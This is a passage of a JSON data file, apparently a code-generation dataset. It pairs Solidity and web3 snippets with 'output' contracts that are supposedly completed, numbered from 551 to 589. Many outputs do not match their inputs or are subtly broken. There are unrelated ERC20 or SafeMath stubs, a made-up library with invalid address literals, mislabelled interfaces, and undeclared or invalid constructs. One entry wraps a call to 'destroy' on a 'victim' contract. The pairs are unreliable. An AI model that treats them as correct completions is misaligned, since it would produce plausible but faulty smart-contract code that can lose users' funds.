ERC721Enumerable.supportsInterface(interfaceId);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC165 {\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\n}\n\n"
    },
    "551.sol": {
        "input": "_mint(to, tokenId, amount, \"\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function mint(address to, uint256 tokenId, uint256 amount)\n        external\n\n        returns (uint256);\n    function burn(uint256 tokenId) external;\n\n    function mint(address to, uint256 tokenId, uint256 amount, bytes memory data)\n        external\n        returns (uint256);\n\n    function burn(uint256 tokenId, bytes memory data) external returns (bytes memory);\n\n    function getMinter(uint256 tokenId) external view returns (address);\n\n    function setMinter(uint256 tokenId, address mint) external;\n\n    function getMintData(uint256 tokenId) external view returns (bytes memory);\n\n    function setMintData(uint256 tokenId, bytes memory data) external;\n\n    function transfer(address to, uint256 tokenId, uint256 amount) external returns (bool);\n\n    function transferFrom(address from, address to, uint256 tokenId, uint256 amount)\n        external\n\n        returns (bool);\n\n    function approve(address to, uint256 tokenId, uint256 amount) external returns (bool);\n\n    function setApprovalForAll(address owner, address operator, bool approved)\n        external\n\n        returns (bool);\n}\n\n"
    },
    "552.sol": {
        "input": "pragma solidity ^0.8.0;\n\ncontract MyContract {\n    uint256 public myVariable;\n\n    function setVariable(uint256 _myVariable) public {\n        myVariable = _myVariable;\n    }\n\n    function getVariable() public view returns (uint256) {\n        return myVariable;\n    }\n}\n\ntruffle compile\n\ntruffle migrate --network name_of_your_network\n\nconst myContractJSON = require(\"./build/contracts/MyContract.json\");\nconst myContractABI = myContractJSON.abi;\nconst myContractAddress = \"0x...\"; \nconst myContract = new web3.eth.Contract(myContractABI, myContractAddress);\n\nconst Web3 = require(\"web3\");\nconst web3 = new Web3(new Web3.providers.HttpProvider(\"http:\n\n\nmyContract.methods.getVariable().call().then(console.log);\n\nconst accounts = await web3.eth.getAccounts();\n\nmyContract.methods.setVariable(5).send({ from: accounts[0] })\n  .then(receipt => console.log(receipt));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256 public myVariable;\n\n    \n    function setVariable(uint256 _myVariable) public {\n        myVariable = _myVariable;\n    }\n\n    \n    function getVariable() public view returns (uint256) {\n        return myVariable;\n    }\n}\n\n"
    },
    "554.sol": {
        "input": "YourTokenStruct[] public yourTokens;\n\nstruct YourTokenStruct {\n    string name;\n    uint256 id;\n}\n\nfunction mint(string memory name, uint256 id) public payable returns(uint256){\n    require(msg.value == 1 ether);\n    require(id > 0);\n    \n    uint _tokenId = yourTokens.push(YourTokenStruct(name, id)) - 1;\n\n    _mint(msg.sender, _tokenId);\n\n    return _tokenId;\n}\n\nfunction withdraw() payable external ifOwner {\n    msg.sender.transfer(address(this).balance);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function mint(string memory name, uint256 id) external returns (uint256);\n}\n\n"
    },
    "557.sol": {
        "input": "bool sent = payable(address(this)).send(msg.value);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Puis {\n    bool sent = payable(address(this)).send(msg.value);\n}\n\n"
    },
    "558.sol": {
        "input": "pragma solidity >=0.8.0;\n\ncontract MappingsC {\n    struct Item {\n        uint groupId;\n        uint itemId;\n    }\n    \n    mapping(uint => Item[]) private items;\n    \n    function setItem(uint groupId, uint itemId) public {\n        items[groupId].push(Item(groupId, itemId));\n    }\n\n    function getItem(uint groupId, uint itemId) public view returns (Item memory) {\n        return items[groupId][itemId];\n    }\n    \n    function getItems(uint groupId) public view returns (Item[] memory) {\n        return items[groupId];\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0;\n\ncontract MappingsC {\n    struct Item {\n        uint groupId;\n        uint itemId;\n    }\n    \n    mapping(uint => Item[]) private items;\n    \n    function setItem(uint groupId, uint itemId) public {\n        items[groupId].push(Item(groupId, itemId));\n    }\n\n    function getItem(uint groupId, uint itemId) public view returns (Item memory) {\n        return items[groupId][itemId];\n    }\n    \n    function getItems(uint groupId) public view returns (Item[] memory) {\n        return items[groupId];\n    }\n}\n\n"
    },
    "559.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo(string[] memory _arg) external {\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo(string[] memory _arg) external {\n    }\n}\n\n"
    },
    "560.sol": {
        "input": "       pragma solidity >0.5.0;\n           contract Greeter {\n                string public greeting;\n                constructor() public {\n                    greeting = 'Hello';\n                }\n                function setGreeting(string memory _greeting) public {\n                    greeting = _greeting;\n                }\n                function greet() view public returns (string memory) {\n                    return greeting;\n                }\n         }\n\n    from brownie import accounts, Greeter\n    \n    def interactions():\n        account = accounts[0]\n        contractObj = Greeter.deploy({\"from\": account})\n        transaction = contractObj.setGreeting(Hola, {\"from\": account})\n        transaction.wait(1)\n        updatedGreeter = contractObj.greet()\n        print(updatedGreeter)\n    \n    def main()\n        interactions()\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Greeter {\n    string public greeting;\n    constructor() public {\n        greeting = 'Hello';\n    }\n    function setGreeting(string memory _greeting) public {\n        greeting = _greeting;\n    }\n    function greet() view public returns (string memory) {\n        return greeting;\n    }\n}\n\n"
    },
    "561.sol": {
        "input": "\npragma solidity >=0.7.0 <0.9.0;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address tokenOwner) external view returns (uint256 balance);\n    function allowance(address tokenOwner, address spender) external view returns (uint256 remaining);\n    function transfer(address to, uint tokens) external returns (bool success);\n    function approve(address spender, uint tokens) external returns (bool success);\n    function transferFrom(address from, address to, uint256 tokens) external returns (bool success);\n\n    event Transfer(address indexed from, address indexed to, uint256 tokens);\n    event Approval(address indexed tokenOwner, address indexed spender, uint256 tokens);\n}\n\ncontract SafeMath {\n    function safeAdd(uint a, uint b) public pure returns (uint c) {\n        c = a + b;\n        require(c >= a);\n    }\n    function safeSub(uint a, uint b) public pure returns (uint c) {\n        require(b <= a); c = a - b; \n        \n    } \n    function safeMul(uint a, uint b) public pure returns (uint c) { \n        c = a * b; require(a == 0 || c / a == b); \n        \n    } \n    function safeDiv(uint a, uint b) public pure returns (uint c) { \n        require(b > 0);\n        c = a / b;\n    }\n}\n\n\ncontract TTKN is IERC20, SafeMath {\n    string public name;\n    string public symbol;\n    uint8 public decimals; \n\n    uint256 public _totalSupply;\n\n    mapping(address => uint256) balances;\n    mapping(address => mapping(address => uint256)) allowed;\n\n    \n    constructor() {\n        name = \"Test Token\";\n        symbol = \"TTKN\";\n        decimals = 18;\n        _totalSupply = 100000000000000000000000000;\n\n        balances[msg.sender] = _totalSupply;\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n        function totalSupply() public override view returns (uint256) {\n            return _totalSupply  - balances[address(0)];\n        }\n\n        function balanceOf(address tokenOwner) public override view returns (uint256 balance) {\n            return balances[tokenOwner];\n        }\n\n        function allowance(address tokenOwner, address spender) public override view returns (uint256 remaining) {\n            return allowed[tokenOwner][spender];\n        }\n\n        function approve(address spender, uint256 tokens) public override returns (bool success) {\n            allowed[msg.sender][spender] = tokens;\n            emit Approval(msg.sender, spender, tokens);\n            return true;\n        }\n\n        function transfer(address to, uint256 tokens) public override returns (bool success) {\n            balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n            balances[to] = safeAdd(balances[to], tokens);\n            emit Transfer(msg.sender, to, tokens);\n            return true;\n        }\n\n        function transferFrom(address from, address to, uint256 tokens) public override returns (bool success) {\n            balances[from] = safeSub(balances[from], tokens);\n            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n            balances[to] = safeAdd(balances[to], tokens);\n            emit Transfer(from, to, tokens);\n            return true;\n        }\n    }\n\n\n",
        "output": "// SPDX-License-Identifier: Unlicensed\n\npragma solidity >=0.7.0 <0.9.0;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address tokenOwner) external view returns (uint256 balance);\n    function allowance(address tokenOwner, address spender) external view returns (uint256 remaining);\n    function transfer(address to, uint tokens) external returns (bool success);\n    function approve(address spender, uint tokens) external returns (bool success);\n    function transferFrom(address from, address to, uint256 tokens) external returns (bool success);\n\n    event Transfer(address indexed from, address indexed to, uint256 tokens);\n    event Approval(address indexed tokenOwner, address indexed spender, uint256 tokens);\n}\n\n// ----------------------------------------------------------------------------\n// Safe Math Library\n// ----------------------------------------------------------------------------\ncontract SafeMath {\n    function safeAdd(uint a, uint b) public pure returns (uint c) {\n        c = a + b;\n        require(c >= a);\n    }\n    function safeSub(uint a, uint b) public pure returns (uint c) {\n        require(b <= a); c = a - b; \n        \n    } \n    function safeMul(uint a, uint b) public pure returns (uint c) { \n        c = a * b; require(a == 0 || c / a == b); \n        \n    } \n    function safeDiv(uint a, uint b) public pure returns (uint c) { \n        require(b > 0);\n        c = a / b;\n    }\n}\n\n\ncontract TTKN is IERC20, SafeMath {\n    string public name;\n    string public symbol;\n    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it\n\n    uint256 public _totalSupply;\n\n    mapping(address => uint256) balances;\n    mapping(address => mapping(address => uint256)) allowed;\n\n    /**\n     * Constrctor function\n     *\n     * Initializes contract with initial supply tokens to the creator of the contract\n     */\n    constructor() {\n        name = \"Test Token\";\n        symbol = \"TTKN\";\n        decimals = 18;\n        _totalSupply = 100000000000000000000000000;\n\n        balances[msg.sender] = _totalSupply;\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n        function totalSupply() public override view returns (uint256) {\n            return _totalSupply  - balances[address(0)];\n        }\n\n        function balanceOf(address tokenOwner) public override view returns (uint256 balance) {\n            return balances[tokenOwner];\n        }\n\n        function allowance(address tokenOwner, address spender) public override view returns (uint256 remaining) {\n            return allowed[tokenOwner][spender];\n        }\n\n        function approve(address spender, uint256 tokens) public override returns (bool success) {\n            allowed[msg.sender][spender] = tokens;\n            emit Approval(msg.sender, spender, tokens);\n            return true;\n        }\n\n        function transfer(address to, uint256 tokens) public override returns (bool success) {\n            balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n            balances[to] = safeAdd(balances[to], tokens);\n            emit Transfer(msg.sender, to, tokens);\n            return true;\n        }\n\n        function transferFrom(address from, address to, uint256 tokens) public override returns (bool success) {\n            balances[from] = safeSub(balances[from], tokens);\n            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n            balances[to] = safeAdd(balances[to], tokens);\n            emit Transfer(from, to, tokens);\n            return true;\n        }\n    }\n\n"
    },
    "562.sol": {
        "input": "   ...\n\n    assert(false);\n\n    return tokenIdsIdx; \n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\nlibrary SafeMathLib {\n\n    \n  uint256 constant MIN_TOKEN_ID = 0;\n\n  \n  function assert(bool _isTrue) internal pure {\n\n  \n    require(_isTrue, \"Assertion failed\");\n  }\n\n  \n  function getTokens() public view returns (address, uint) {\n    return (0x1234567890abcdef, 1234567890);\n  }\n\n  \n  \n  function getTokensById(address token) public view returns (uint256, uint256) {\n    if (token == 0x1234567890abcdef) {\n      return (1234567890, 1337);\n    }\n\n    assert(false);\n\n    return (0, 0);\n  }\n\n  \n  function getTokenId() public view returns (uint256) {\n    return MIN_TOKEN_ID;\n  }\n\n  \n  function getTokenByIdx(address token, uint256 tokenIdx) public view returns (uint256, uint256) {\n    if (token == 0x1234567890abcdef) {\n      return (1234567890, 1337);\n    }\n\n    assert(false);\n\n    return (0, 0);\n  }\n\n}\n\n"
    },
    "563.sol": {
        "input": "function _setApprovalForAll(\n        address owner,\n        address operator,\n        bool approved\n    ) internal virtual {\n        require(owner != operator, \"ERC721: approve to caller\");\n        _operatorApprovals[owner][operator] = approved;\n        emit ApprovalForAll(owner, operator, approved);\n    }\n\nmapping(address => mapping(address => bool)) private _operatorApprovals;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC721 {\n\n\nfunction approved(address, uint256 tokenId) external view returns (bool);\n\n\nfunction getApproved(address tokenOwner, uint256 tokenId) external view returns (address operator);\n\n\nfunction setApprovalForAll(address operator, bool approved) external virtual;\n\n\nfunction isApprovedForAll(address owner, address operator) external view returns (bool);\n\n}\n\n"
    },
    "564.sol": {
        "input": "function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable;\nfunction safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;\nfunction transferFrom(address _from, address _to, uint256 _tokenId) external payable;\n\nuint256 fee = 0.1 ether;\nfunction transferFrom(address _from, address _to, uint256 _tokenId) external payable{\n    require(msg.value >= fee, \"sent ether is lower than fee\")\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface IERC20 {\n  \n  function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable;\n  function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;\n  function transferFrom(address _from, address _to, uint256 _tokenId) external payable;\n}\n\n"
    },
    "565.sol": {
        "input": "pragma solidity >=0.5.0 <0.9.0;\n\ncontract Day4 {\n    address owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function send(address payable[] memory to, uint256[] memory amount)\n        public\n        payable\n        ownerOnly\n    {\n        require(to.length == amount.length, \"to must be same length as amount\");\n        for (uint256 i = 0; i < to.length; i++) {\n            to[i].transfer(amount[i]);\n        }\n    }\n\n    modifier ownerOnly() {\n        require(msg.sender == owner,\"You are not the owner\");\n        _;\n    }\n\n    function deposit() public payable {\n\n    }\n} \n\n\n",
        "output": "//SPDX-License-Identifier: UNLICENSED\npragma solidity >=0.5.0 <0.9.0;\n\ncontract Day4 {\n    address owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function send(address payable[] memory to, uint256[] memory amount)\n        public\n        payable\n        ownerOnly\n    {\n        require(to.length == amount.length, \"to must be same length as amount\");\n        for (uint256 i = 0; i < to.length; i++) {\n            to[i].transfer(amount[i]);\n        }\n    }\n\n    modifier ownerOnly() {\n        require(msg.sender == owner,\"You are not the owner\");\n        _;\n    }\n\n    // NOTE: Call this function for first, and before this operation set the values inside msg.value textbox in \n    //       Remix IDE (if you're using it) \n    function deposit() public payable {\n\n    }\n} \n\n"
    },
    "566.sol": {
        "input": "import \"A.sol\";\n\nA a = new A(argumnet) \n\naddress(a) \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract A {\n    string public name;\n    address public owner;\n    mapping(address => uint256) private amount;\n  \n    constructor(address payable owner_address) public {\n      \n        owner = owner_address;\n        amount[owner_address] = 1 ether;\n        name = \"Ada\";\n    }\n}\n\n"
    },
    "567.sol": {
        "input": "...\nfor (uint i=0; i<len; i++) {\n    try IERC20(tokenAddresses[i]).balanceOf(walletAddress) returns (uint256 balance) {\n        balances[i] = balance;\n    } catch {}\n}\n...\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n}\n\ncontract MyContract {\n    function getBalances(address[] memory tokenAddresses, address walletAddress) external view returns (uint256[] memory) {\n        uint256 len = tokenAddresses.length;\n        uint256[] memory balances = new uint256[](len);\n        \n        for (uint256 i = 0; i < len; i++) {\n            try IERC20(tokenAddresses[i]).balanceOf(walletAddress) returns (uint256 balance) {\n                balances[i] = balance;\n            } catch {}\n        }\n        \n        return balances;\n    }\n}\n"
    },
    "568.sol": {
        "input": "import \"@openzeppelin/contracts-upgradeable/token/ERC721/IERC721Upgradeable.sol\";\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC721Upgradeable {\n    function balanceOf(address owner) external view returns (uint256);\n}\n\n"
    },
    "569.sol": {
        "input": "function get_last_tokenID() public view returns (uint256) {\n    return(_tokenIds.current());\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface IERC20 {\n\n  function get_last_tokenID() public view returns (uint256);\n}\n\n"
    },
    "571.sol": {
        "input": "oracleResponses[key] = ResponseInfo({requester: msg.sender, isOpen: true});\n\noracleResponses[key].requester = msg.sender;\noracleResponses[key].isOpen = true;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract OracleResponse {\n    mapping(bytes32 => ResponseInfo) public oracleResponses;\n\n    struct ResponseInfo {\n        address requester;\n        bool isOpen;\n    }\n\n    event RequestForResponse(bytes32 indexed id, bool indexed responseOpen);\n\n    function sendResponse(bytes32 id) public returns (bool isResponseOpen) {\n        ResponseInfo storage response = oracleResponses[id];\n        response.isOpen = true;\n        emit RequestForResponse(id, response.isOpen);\n        return response.isOpen;\n    }\n\n    function setResponseOpen(bytes32 id, bool isOpen) public {\n        oracleResponses[id].isOpen = isOpen;\n    }\n}\n\n"
    },
    "572.sol": {
        "input": "function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts);\n\nfunction swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;\n\n\n",
        "output": "pragma solidity ^0.5.16;\ncontract UniswapV2Factory {\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts);\n}\n\n"
    },
    "573.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract TargetContract {\n    function foo() external pure returns (bool) {\n        return true;\n    }\n}\n\npragma solidity ^0.8;\n\ninterface ITargetContract {\n    function foo() external returns (bool);\n}\n\ncontract SourceContract {\n    function baz() external {\n        ITargetContract targetContract = ITargetContract(address(0x123));\n        bool returnedValue = targetContract.foo();\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract TargetContract {\n    function foo() external pure returns (bool) {\n        return true;\n    }\n}\n\npragma solidity ^0.8;\n\ninterface ITargetContract {\n    function foo() external returns (bool);\n}\n\ncontract SourceContract {\n    function baz() external {\n        ITargetContract targetContract = ITargetContract(address(0x123));\n        bool returnedValue = targetContract.foo();\n    }\n}\n\n"
    },
    "574.sol": {
        "input": "pragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract GameToken is ERC20 {\n    address private gameBackend;\n\n    constructor(address _gameBackend) ERC20(\"Game Token\", \"GT\") {\n        gameBackend = _gameBackend;\n    }\n\n    function mint(address to, uint256 amount) external {\n        require(msg.sender == gameBackend, \"Only game backend can mint tokens\");\n        _mint(to, amount);\n    }\n}\n\nasync function swapOffchainToOnchainTokens(userAddress, swapAmount) {\n\n     the user\n    const gameTokenContract = new web3.eth.Contract(GameTokenABI, \n    GameTokenAddress);\n    await gameTokenContract.methods.mint(userAddress, \n    swapAmount).send({ from: gameBackendAddress });\n }\n\n function mint(address to, uint256 amount) external {\n    require(msg.sender == gameBackend, \"Only game backend can mint \n    tokens\");\n    _mint(to, amount);\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\nlibrary SafeMath {\n     function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b <= a, \"SafeMath: subtraction underflow\");\n        return a - b;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n             return 0;\n        }\n        uint c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n}\n\nlibrary LibString {\n    \n    function strConcat(string memory a, string memory b, string memory c) \n    internal pure returns (string memory) {\n        return string(abi.encodePacked(a, b, c));\n    }\n\n\n}\n\n"
    },
    "575.sol": {
        "input": "pragma solidity ^0.6.0;\n\nimport \"./ERC721.sol\";\n\ncontract Mytoken is ERC721 {\n    string constant name = \"MyToken\";\n    string constant symbol = \"MTKN\";\n\n    constructor() ERC721(name, symbol) {\n        \n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC721 {\n\n    event Transfer(address indexed from, address indexed to, bytes32 indexed tokenId, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, bytes32 indexed tokenId);\n\n    function balanceOf(address owner) external view returns (uint256 balance);\n\n    function safeTransferFrom(address from, address to, uint256 tokenId, uint256 value, bytes memory data) external;\n\n    function transferFrom(address from, address to, uint256 tokenId) external;\n\n    function approve(address spender, uint256 tokenId) external;\n\n    function getApproved(bytes32 tokenId) external view returns (address);\n\n    function setApprovalForAll(address operator, uint256 tokenId, uint256 value) external;\n}\n\n"
    },
    "577.sol": {
        "input": "compiled_sol=compile_standard({\n    # not \"solidity\"\n    \"language\":\"Solidity\",\n    # not \"simpleStorage\"\n    \"sources\":{\"SimpleStorage.sol\":{\"content\":simple_storage_file}},\n    \"settings\":{\n        \"outputSelection\":{\n            \"*\":{\n                \"*\":[\"abi\",\"metadata\",\"evm.bytecode\",\"evm.sourceMap\"]\n            }\n        }\n    }\n},\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract SimpleStorage {\n    string public constant name = \"Simple Storage Example Contract\";\n    uint256 public constant age = 25;\n}\n\n"
    },
    "578.sol": {
        "input": "struct voter {\n     uint ID;\n     string firstName;\n     string lastName;\n }\n\n contract Poll {\n     uint public numVoters;\n\n     event VoterAdded(\n         voter newVoter\n     );\n\n     function AddVoter(string memory _firstName, string memory _lastName) public returns \n     (voter memory)\n     {\n         numVoters++;\n         voter memory _voter = voter(numVoters, _firstName, _lastName);\n         _voter.ID = numVoters;\n         _voter.firstName = _firstName;\n         _voter.lastName = _lastName;\n         emit VoterAdded(_voter);\n         return _voter;\n\n     }\n} \n\nit('Poll 1 : create voter and candidate objects2', async () => {  \n      const tx = await poll.AddVoter('Jack', 'Jackson');\n      const reciept = await tx.wait();\n      const [ VoterAdded ] = reciept.events || [];\n      const result = [...(VoterAdded.args || [])]; \n      const JJ = result[0];\n      assert.equal(JJ.firstName, 'Jack');\n   });\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Poll1 {\n  struct voter {\n       uint ID;\n       string firstName;\n       string lastName;\n    }\n\n    event VoterAdded(\n        voter newVoter\n    );\n\n     function AddVoter(string memory _firstName, string memory _lastName) \n     public returns \n     (voter memory)\n    {\n        numVoters++;\n        voter memory _voter = voter(numVoters, _firstName, _lastName);\n        _voter.ID = numVoters;\n        _voter.firstName = _firstName;\n        _voter.lastName = _lastName;\n        emit VoterAdded(_voter);\n        return _voter;\n\n     }\n     mapping (uint => voter) public voters;\n    uint public numVoters;\n\n     constructor() {\n         numVoters = 0;\n     }\n}\n\n"
    },
    "579.sol": {
        "input": "struct ProposalVote {\n    bool isTrue;\n    uint256[] votes;\n    mapping(address => bool) hasVoted;\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ProposalVoter {\n struct ProposalVote {\n    bool isTrue;\n    uint256[] votes;\n    mapping(address => bool) hasVoted;\n }\n    \nmapping(address => ProposalVote) public votes;\n \n    function propose(bool _proposal) public {     \n      votes[msg.sender].isTrue = _proposal;\n      votes[msg.sender].votes.push(msg.value);\n      votes[msg.sender].hasVoted[msg.sender] = true;     \n    }    \n}\n\n"
    },
    "580.sol": {
        "input": "contract Pool is ERC20 {\n  ...\n  function deposit(uint256 amount) public payable {\n    uint256 contractBalance = ERC20(stakeToken).balanceOf(address(this));\n    uint256 proportion = amount * totalSupply() / contractBalance;\n    ERC20(stakeToken).transferFrom(msg.sender, address(this), amount);\n    _mint(msg.sender, proportion);\n  }\n\n  function withdraw() public payable {\n    uint256 proportion = balanceO(msg.sender);\n    uint256 contractBalance = ERC20(stakeToken).balanceOf(address(this));\n    uint256 withdrawAmount = proportion * contractBalance / totalSupply();\n    _burn(msg.sender, proportion);\n    \n    ERC20(stakeToken).transfer(msg.sender, withdrawAmount);\n  }\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC20 {\n  function totalSupply() external view returns (uint);\n  function balanceOf(address) external view returns (uint);\n  function transfer(address, uint) external returns (bool);\n}\n\n"
    },
    "581.sol": {
        "input": "encode_mwr [type=\"ethabiencode\"\n            abi=\"(bytes32 requestId, string _volume)\"\n            data=\"{\\\\\"requestId\\\\\": $(decode_log.requestId), \\\\\"_volume\\\\\": $(volume_parse)}\"\n            ]\n\npragma solidity ^0.8.7;\n\nimport \"@chainlink/contracts/src/v0.8/ChainlinkClient.sol\";\n\n * Request testnet LINK and ETH here: https:\n * Find information on LINK Token Contracts and get the latest ETH and LINK faucets here: https:\n\ncontract APIConsumer is ChainlinkClient {\n    using Chainlink for Chainlink.Request;\n  \n    string public volume;\n    \n    address private oracle;\n    bytes32 private jobId;\n    uint256 private fee;\n    \n    \n    constructor() {\n        setPublicChainlinkToken();\n        oracle = 0xF405B99ACa8578B9eb989ee2b69D518aaDb90c1F;\n        jobId = \"c51694e71fa94217b0f4a71b2a6b565a\";\n        fee = 0.1 * 10 ** 18; \n    }\n    \n    \n    function requestVolumeData() public returns (bytes32 requestId) \n    {\n        Chainlink.Request memory request = buildChainlinkRequest(jobId, address(this), this.fulfill.selector);\n        \n        request.add(\"get\", \"https:\n        \n        request.add(\"path\", \"RAW.ETH.USD.MARKET\");\n        \n        \n        return sendChainlinkRequestTo(oracle, request, fee);\n    }\n    \n    \n \n    function fulfill(bytes32 _requestId, string memory _volume) public recordChainlinkFulfillment(_requestId)\n    {\n        volume = _volume;\n        \n    }\n    \n}\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IChainlinkClient {\n    function sendChainlinkRequestTo( address oracle, bytes calldata request, uint256 fee) external;\n}\n\n"
    },
    "582.sol": {
        "input": "modifier isValidCertificate(bytes data) {\n    require(something);\n    _;\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ninterface IValidation {\n    function isValidCertificate(bytes data) view returns (bool);\n}\n\ncontract Validation {\n\n    modifier isValidCertificate(bytes data) {\n        require(IValidation(msg.sender).isValidCertificate(data));\n        _;\n    }\n\n    constructor() public {\n    }\n\n    function validate(bytes data) public isValidCertificate(data) {\n        IValidation(msg.sender).isValidCertificate(data);\n    }\n}\n\n"
    },
    "584.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    struct Foo {\n        string foo1;\n    }\n\n    Foo foo1 = Foo(\"foo\");\n\n    function myFunction() public {\n        Foo memory foo2 = Foo(\"foo\"); \n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    struct Foo {\n        string foo1;\n    }\n\n    // implicit `storage` location of the property\n    Foo foo1 = Foo(\"foo\");\n\n    function myFunction() public {\n        // need to explicitly state location of the variable\n        Foo memory foo2 = Foo(\"foo\"); \n    }\n}\n\n"
    },
    "586.sol": {
        "input": "contract Evolution is IERC721Receiver {\n    function change(uint256 gen1tokenId) external {\n        EXAMPLE_CONTRACT.safeTransferFrom(msg.sender, address(this), gen1tokenId);\n    }\n\n    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) override external returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC721Receiver {\n    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external returns (bool);\n}\n\n"
    },
    "587.sol": {
        "input": "victim.call(abi.encodeWithSignature(\"destroy(address)\", _to));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract FakeERC1776 {\n    address public victim;\n\n    constructor() public {\n        victim = msg.sender;\n    }\n\n    function destroy(address _from) public {\n        victim.call(abi.encodeWithSignature(\"destroy(address)\", _from));\n    }\n}\n\n"
    },
    "588.sol": {
        "input": "for(uint i = _findForm; _mycoin.length; i++)\n\nshould be\n\nfor(uint i = _findForm; i < _mycoin.length; i++)\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC20 {\n    function balanceOf(address owner) external view returns (uint balance);\n    function transfer(address recipient, uint amount) external returns (bool success);\n    function allowance(address owner, address spender) external view returns (uint remaining);\n    function approve(address spender, uint amount) external returns (bool success);\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool success);\n    event Transfer(address indexed from, address indexed to, uint value);\n    event Approval(address indexed owner, address indexed spender, uint value);\n}\n\n"
    },
    "589.sol": {
        "input": "contract test {\n    address[] arr1 = [0x778E08a594887B208d18a429cfD30d740e0fea71, 0xE8088D6c465Eaa58E123aa08623abaAFFBBBB55B];\n    \n    function arrayFunction() public pure{\n        address[] memory arr2 = new address[](2);\n        arr2[0] = 0x778E08a594887B208d18a429cfD30d740e0fea71;\n        arr2[1] = 0xE8088D6c465Eaa58E123aa08623abaAFFBBBB55B;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract test {\n    address[] arr1 = [0x778E08a594887B208d18a429cfD30d740e0fea71, 0xE8088D6c465Eaa58E123aa08623abaAFFBBBB55B];\n    \n    function arrayFunction() public pure{\n        address[] memory arr2 = new address[](2);\n        arr2[0] = 0x778E08a594887B208d18a429cfD30d740e0fea71;\n        arr2[1] = 0xE8088D6c465Eaa58E123aa08623abaAFFBBBB55B;\n    }\n}\n\n"
    },
    "591.sol": {
